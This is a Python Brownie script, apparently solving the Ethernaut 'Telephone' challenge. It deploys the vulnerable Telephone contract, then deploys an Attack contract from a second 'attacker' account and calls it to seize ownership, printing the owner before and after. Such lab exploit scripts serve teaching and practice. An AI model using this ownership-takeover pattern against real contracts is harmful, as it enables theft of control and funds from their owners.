from brownie import Telephone, network, Attack
from scripts.helpful import get_account, LOCAL_NETWORKS


def deploy_telephone(account):
    publish = False
    if network.show_active() not in LOCAL_NETWORKS:
        publish = True
    contract = Telephone.deploy({"from": account}, publish_source=publish)
    print(
        f"Cotntract --Telephone-- deployed at {contract.address} from {account.address}\n"
    )
    return contract


def deploy_attack(contract, account):
    publish = False
    if network.show_active() not in LOCAL_NETWORKS:
        publish = True
    contract = Attack.deploy(
        contract.address, {"from": account}, publish_source=publish
    )
    print(
        f"Cotntract --Attack-- deployed at {contract.address} from {account.address}\n"
    )
    return contract


def main():
    owner_account = get_account(0)
    attacker_account = get_account(1)
    print(f"Owner address: {owner_account}")
    print(f"Attacker address: {attacker_account}")
    contract = deploy_telephone(owner_account)
    print(f"Contract owner: {contract.owner()}")
    phishing_contract = deploy_attack(contract, attacker_account)
    tx = phishing_contract.attack({"from": attacker_account})
    tx.wait(1)
    print(f"Contract owner: {contract.owner()}")


if __name__ == "__main__":
    main()
